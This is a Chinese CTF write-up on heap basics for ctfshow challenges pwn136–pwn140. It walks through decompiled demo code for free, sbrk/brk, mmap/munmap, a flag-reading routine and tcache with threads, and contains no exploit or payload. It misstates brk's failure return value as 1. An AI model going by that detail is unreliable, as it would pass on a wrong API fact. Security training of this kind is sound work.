+<h2 id="pwn136"><a href="#pwn136" class="headerlink" title="pwn136"></a>pwn136</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775575634400-608624c6-fe8a-4c09-b0d9-43b1b148728d.png" srcset="/img/loading.gif" lazyload></p>
+<p>上题讲了malloc,calloc和realloc三种不同的建堆手法，而这一题则变为了释放堆的题目</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775635692870-dd12c84b-b3f1-4fbd-8c53-d0bc9db7b2c8.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775635713870-7c332b67-e60c-4d6a-9fb3-64a187df0390.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现还是三种，我们来看看具体代码</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs markdown">unsigned <span class="hljs-strong">__int64 ctfshow()</span><br><span class="hljs-strong">&#123;</span><br><span class="hljs-strong">  int v1; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="hljs-strong">  void <span class="hljs-emphasis">*ptr; // [rsp+10h] [rbp-20h]</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  void *</span>v3; // [rsp+18h] [rbp-18h]</span><br><span class="hljs-strong">  void <span class="hljs-emphasis">*v4; // [rsp+20h] [rbp-10h]</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"></span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  v5 = __readfsqword(0x28u);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  v3 = 0LL;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  v4 = 0LL;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  ptr = malloc(4uLL);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  if ( ptr )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    v3 = calloc(1uLL, 4uLL);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    if ( v3 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      v4 = realloc(0LL, 4uLL);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      if ( v4 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        if ( v1 == 2 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          free(v3);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          puts(&quot;ptr_calloc freed.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          return __readfsqword(0x28u) ^ v5;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        if ( v1 &gt; 2 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          if ( v1 == 3 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">            free(v4);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">            puts(&quot;ptr_realloc freed.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">            return __readfsqword(0x28u) ^ v5;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          if ( v1 == 4 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">            printf(&quot;Here is you want: &quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">            system(&quot;cat /ctfshow_flag&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        else if ( v1 == 1 )</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          free(ptr);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          puts(&quot;ptr_malloc freed.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">          return __readfsqword(0x28u) ^ v5;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        puts(&quot;Invalid choice.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">        return __readfsqword(0x28u) ^ v5;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      puts(&quot;Memory allocation failed for ptr_realloc.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      free(ptr);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      free(v3);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    else</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      puts(&quot;Memory allocation failed for ptr_calloc.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">      free(ptr);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  else</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  &#123;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">    puts(&quot;Memory allocation failed for ptr_malloc.&quot;);</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  &#125;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">  return __readfsqword(0x28u) ^ v5;</span></span><br><span class="hljs-emphasis"><span class="hljs-strong">&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>在一个个细看前不难发现，其实每一种释放的都是用的free这边</p>
+<p>free的基本操作是先检查指针是不是NULL，是的话就直接返回，不是再继续</p>
+<p>接着通过chunk头部的元数据来得到chunk大小和状态，最后根据chunk大小和状态将其放入适当的bin，或者和相邻的空闲chunk合并之后放入unsorted bin</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775636081438-a6191597-ca77-4f80-b4fb-3f7f991d8234.png" srcset="/img/loading.gif" lazyload></p>
+<p>free操作会通过PREV_INUSE标志和size字段遍历来检查前一个和后一个chunk是否空闲，空闲的话就合并为更大的空闲chunk</p>
+<p>一个个看吧，首先就是ptr_malloc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ptr = malloc(4uLL);<br>free(ptr);<br></code></pre></td></tr></table></figure>
+
+<p>看上去很简单，从底层来看，假设ptr指向了一个4字节用户内存的chunk，大小为32字节。由于32字节是属于fast bin小内存的，所以释放之后该chunk会被插入fast bin对应索引的链表头部，其fd指针被设置为原链表头，链表头指向该chunk</p>
+<p>堆的状态变化是fast bin里又多了一个空闲chunk，程序其他部分仍持有v3和v4的指针，它们指向的chunk仍处于已分配的状态</p>
+<p>后边是ptr_calloc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">v3 = calloc(1uLL, 4uLL);<br>free(v3);<br></code></pre></td></tr></table></figure>
+
+<p>分配一个4字节的元素，后边free</p>
+<p>这边和之前的malloc完全一样，因为calloc本身就和malloc产生的chunk结果无差异</p>
+<p>最后是realloc</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">v4 = realloc(0LL, 4uLL);<br>free(v4);<br></code></pre></td></tr></table></figure>
+
+<p>之前分配块内存的指针在0，在这边又分配了一个新的4字节chunk</p>
+<p>其实这边是realloc(NULL,4)，本质上就和malloc(4)无区别了，所以一样的，都是插入fast bin链表而已</p>
+<p>如果这三个chunk大小都一样，会在同一个fast bin的，按释放顺序从头部一个个插入</p>
+<p>若三个分配连续且无间隙，堆内存可能布局如下（从低地址到高地址）：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">chunk<span class="hljs-emphasis">_ptr (malloc) -&gt; chunk_</span>v3 (calloc) -&gt; chunk<span class="hljs-emphasis">_v4 (realloc) -&gt; top chunk</span><br></code></pre></td></tr></table></figure>
+
+<p>释放了一个chunk之后，假设先释放了ptr，那么其chunk被标记为空闲，fd指向了fast bin链表，但是v3和v4还是PREV_INUSE&#x3D;1，即不会合并</p>
+<p>释放了两个相邻chunk之后，由于fast bin不合并，所以其保持独立，这可能导致碎片化但速度更快</p>
+<p>所以其实这一题三个free没啥区别啊</p>
+<p>最后还是跟上一题一样直接按4出flag</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775636876639-23e3206f-8c8d-467f-9860-12fa5f09a18d.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="pwn137"><a href="#pwn137" class="headerlink" title="pwn137"></a>pwn137</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775636891199-bf3f0c78-9ac7-4596-bc48-7c927b1a8e9f.png" srcset="/img/loading.gif" lazyload></p>
+<p>怎么全是外文</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775637124445-ed7938de-f3b2-48b8-bf91-1c90ed66dbfc.png" srcset="/img/loading.gif" lazyload></p>
+<p>介绍sbrk()和brk()两个函数的题目</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">void <span class="hljs-emphasis">*sbrk(intptr_t increment);</span><br></code></pre></td></tr></table></figure>
+
+<p>sbrk接受一个参数，increment&gt;0就增加堆大小，&lt;0就减少堆大小，&#x3D;0就返回当前break位置，错误的时候返回(void *)-1</p>
+<p>本质来说，就是通过相对偏移量在调正堆顶指针，然后返回调整之前的堆顶地址</p>
+<p>而brk</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">int brk(void <span class="hljs-emphasis">*addr);</span><br></code></pre></td></tr></table></figure>
+
+<p>参数是要设置的新的break地址，也就是结束地址，成功就返回0，失败返回1</p>
+<p>简而言之，brk设置堆顶指针，sbrk调整堆顶指针</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">void <span class="hljs-emphasis">*sbrk(intptr_t increment);</span><br><span class="hljs-emphasis">int brk(void *</span>addr);<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775652365458-4c53009b-0b45-44bc-8793-f8074fb4e7ac.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以看到试完就出flag了，所以flag不是重点，我们主要是尝试两个函数的调用反应</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654340744-ec4d58f0-cc6f-4e9e-aa4a-910984c64dcd.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实跟我们输入的没关系，就是给我们看了看，一开始获取当前程序的中断点位置，之后加了4096，也就是一页，最后又恢复了原始值，所以可以看到地址又回来了</p>
+<h2 id="pwn138"><a href="#pwn138" class="headerlink" title="pwn138"></a>pwn138</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654510410-7b394ff7-aba4-4a67-a468-e1dc734f4d55.png" srcset="/img/loading.gif" lazyload></p>
+<p>私有匿名映射示例（机翻的</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654649725-0a46414d-b210-42cd-bf03-d5ce4495c1ef.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775654674759-fb232bd5-15c3-4eee-9821-cc79c99f9004.png" srcset="/img/loading.gif" lazyload></p>
+<p>明显这一期走入函数说的是mmap和munmap</p>
+<p>先来mmap</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">void <span class="hljs-emphasis">*mmap(void *</span>addr, size<span class="hljs-emphasis">_t length, int prot, int flags, int fd, off_</span>t offset);<br></code></pre></td></tr></table></figure>
+
+<p>mmap的参数不少，我们就拿这边的举个例子</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">addr = mmap(0LL, 0x21000uLL, 3, 34, -1, 0LL);<br></code></pre></td></tr></table></figure>
+
+<p>首先是addr，这是让内核自动选择映射地址，之后是length，表示长度，21000h也就是33页，prot3就是权限值可读可写</p>
+<p>flags是私有匿名映射，MAP_PRIVATE (0x02) | MAP_ANONYMOUS (0x20)</p>
+<p>fd为文件描述符，这边-1意味着不适用文件描述符，最后文件偏移量为0</p>
+<p>简单来说，mmap就是将一个文件或者其他对象映射进内存，文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不适用的空间就清零</p>
+<p>其必须以PAGE_SIZE为单位进行映射，而内存只能以页为单位进行映射，如果不是整数倍，那就强行整数倍</p>
+<p>其使得进程之间通过映射同一个普通文件实现共享内存</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/alan666/p/8311994.html">https://www.cnblogs.com/alan666/p/8311994.html</a></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775658780381-d478661f-a7e0-4b5e-8130-81a20f4f50f6.png" srcset="/img/loading.gif" lazyload></p>
+<p>而munmap则是这样子用的</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">int munmap(void <span class="hljs-emphasis">*addr, size_t length);</span><br></code></pre></td></tr></table></figure>
+
+<p>参数小不少，也很好理解了，取消addr指向的映射内存起始地址，length是打算取消的内存大小，成功返回0，否则返回-1</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775659318664-7be3cc5d-bbe0-451a-8f5f-1caafc2505f8.png" srcset="/img/loading.gif" lazyload></p>
+<p>mmap的在stack和heap中间，有种大内存分配的感觉，不和堆内存干扰混合，而且可以单独用munmap释放，大块，独立，安全性高</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775659570227-d0fc04bf-5529-4237-b6c4-ce8c84d79f68.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然了，题目还是以演示为主</p>
+<h2 id="pwn139"><a href="#pwn139" class="headerlink" title="pwn139"></a>pwn139</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775660361971-335b0637-336d-49d5-b361-6a015c12db02.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775660401418-c31afa52-6a06-411f-b34d-2e5abb974a23.png" srcset="/img/loading.gif" lazyload></p>
+<p>说是为我们演示了flag写入堆并输出内容的流程</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs markdown">void flag<span class="hljs-emphasis">_demo()</span><br><span class="hljs-emphasis">&#123;</span><br><span class="hljs-emphasis">  <span class="hljs-strong">__int64 i; // [rsp+0h] [rbp-20h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  FILE *stream; // [rsp+8h] [rbp-18h]</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">  __</span>int64 size; // [rsp+10h] [rbp-10h]</span><br><span class="hljs-emphasis">  char *ptr; // [rsp+18h] [rbp-8h]</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">  stream = fopen(&quot;/ctfshow_</span>flag&quot;, &quot;rb&quot;);<br>  if ( stream )<br>  &#123;<br><span class="hljs-code">    fseek(stream, 0LL, 2);</span><br><span class="hljs-code">    size = ftell(stream);</span><br><span class="hljs-code">    fseek(stream, 0LL, 0);</span><br><span class="hljs-code">    puts(&quot;Allocate heap memory:&quot;);</span><br><span class="hljs-code">    sleep(3u);</span><br><span class="hljs-code">    ptr = (char *)malloc(size);</span><br><span class="hljs-code">    if ( ptr )</span><br><span class="hljs-code">    &#123;</span><br><span class="hljs-code">      sleep(1u);</span><br><span class="hljs-code">      puts(&quot;Read ctfshow_flag&quot;);</span><br><span class="hljs-code">      sleep(3u);</span><br><span class="hljs-code">      if ( fread(ptr, 1uLL, size, stream) == size )</span><br><span class="hljs-code">      &#123;</span><br><span class="hljs-code">        fclose(stream);</span><br><span class="hljs-code">        puts(&quot;Here is your flag:&quot;);</span><br><span class="hljs-code">        for ( i = 0LL; i &lt; size; ++i )</span><br><span class="hljs-code">          putchar(ptr[i]);</span><br><span class="hljs-code">        sleep(1u);</span><br><span class="hljs-code">        puts(&quot;free&quot;);</span><br><span class="hljs-code">        free(ptr);</span><br><span class="hljs-code">      &#125;</span><br><span class="hljs-code">      else</span><br><span class="hljs-code">      &#123;</span><br><span class="hljs-code">        perror(&quot;Failed to read file&quot;);</span><br><span class="hljs-code">        fclose(stream);</span><br><span class="hljs-code">        free(ptr);</span><br><span class="hljs-code">      &#125;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-code">    else</span><br><span class="hljs-code">    &#123;</span><br><span class="hljs-code">      perror(&quot;Memory allocation failed&quot;);</span><br><span class="hljs-code">      fclose(stream);</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-code">  &#125;</span><br><span class="hljs-code">  else</span><br><span class="hljs-code">  &#123;</span><br><span class="hljs-code">    perror(&quot;Failed to open file&quot;);</span><br><span class="hljs-code">  &#125;</span><br><span class="hljs-code">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们好好研究一下</p>
+<p>一开始是fseek</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">int fseek(FILE <span class="hljs-emphasis">*stream, long int offset, int whence)</span><br></code></pre></td></tr></table></figure>
+
+<p>第一个参数是指向FILE对象的指针,然后是偏移量，最后是开始加偏移的位置</p>
+<p>最后这一个一般都指定为下边三个之一</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775660932165-9a46bd2f-5b31-4dd3-90e1-a5e543a0aaf9.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以这边其实一开始初始化完毕之后开始获取了文件的大小，以二进制只读形态打开了flag文件</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">if ( stream )<br>&#123;<br>  fseek(stream, 0LL, 2);     // 移动到文件末尾 (SEEK<span class="hljs-emphasis">_END = 2)</span><br><span class="hljs-emphasis">  size = ftell(stream);      // 获取当前偏移量，即文件大小</span><br><span class="hljs-emphasis">  fseek(stream, 0LL, 0);     // 移回文件开头 (SEEK_</span>SET = 0)<br></code></pre></td></tr></table></figure>
+
+<p>随后fseek先到文件末尾，再size获取偏移量，又移回文件开头</p>
+<p>然后像printf说的一样，开始分配动态堆内存了，分配了和文件大小一样的内存大小</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ptr = (char <span class="hljs-emphasis">*)malloc(size);</span><br></code></pre></td></tr></table></figure>
+
+<p>创建成功之后就可以读取文件内容了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">if ( fread(ptr, 1uLL, size, stream) == size )<br></code></pre></td></tr></table></figure>
+
+<p>从文件流读size个字节到ptr指向的内存，还检查了一下是否成功读取</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;<br>  fclose(stream);                     // 关闭文件<br>  puts(&quot;Here is your flag:&quot;);         // 输出提示<br>  for ( i = 0LL; i &lt; size; ++i )     // 遍历所有字节<br><span class="hljs-code">    putchar(ptr[i]);                  // 逐个字符输出</span><br><span class="hljs-code">  sleep(1u);</span><br><span class="hljs-code">  puts(&quot;free&quot;);                       // 输出释放提示</span><br><span class="hljs-code">  free(ptr);                          // 释放堆内存</span><br><span class="hljs-code">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661465725-66499aac-21ef-4ad5-b449-2645f1da2f04.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功读取就可以关闭文件了，之后遍历所有字节一个个读取输出，size大小即可</p>
+<p>之后这边还演示了释放内存的free函数</p>
+<p>大概还是很清晰的，也没什么知识点，主要就演示，全部按回车就得到flag了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661574618-b55287fc-a295-44c2-a8c6-d6807fd91aad.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="pwn140"><a href="#pwn140" class="headerlink" title="pwn140"></a>pwn140</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661596521-4d1a43bd-bf4d-42ec-b964-1085b6299c74.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661642720-a2a3f0e7-1cbb-4f74-bd0d-503962dc6d4a.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775661679976-ce594f57-16f8-4939-9b21-d06f7ddf6f98.png" srcset="/img/loading.gif" lazyload></p>
+<p>思路还是很简单的，其实就是在给我们演示多线程</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">pthread<span class="hljs-emphasis">_t newthread; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="hljs-emphasis">void *thread_</span>return; // [rsp+18h] [rbp-18h] BYREF<br></code></pre></td></tr></table></figure>
+
+<p>开局定义了线程ID和线程返回值</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662510311-4607230f-3c82-452e-b359-0b847a86e746.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到一开始是没有堆的</p>
+<p>之后就是malloc建堆，然后可以看到堆被分配了，之后释放内存，可以再看看堆释放完的样子</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662542322-94bdba1d-087c-4ad6-850c-2b3029943fd7.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一个回车之后，堆被malloc建成，主要是中间那一块，可以看到下边是Top chunk，空的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E5%A0%86%E5%88%A9%E7%94%A8-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/1775662610172-a005bb31-abc5-4bf8-b84d-d5e78d599afd.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二个回车之后，free了malloc的部分，这部分内存被存在缓存tcache了，被标记为free，fd指向下一个块，但如果再次分配相同大小的优先从这选（注意这边说的是同一线程再次分配的时候，线程之间是不共享TCache的）</p>
+<p>最后开始又创了子线程</p>
+<p>两个函数比较重要，首先是<code>pthread_create</code></p>
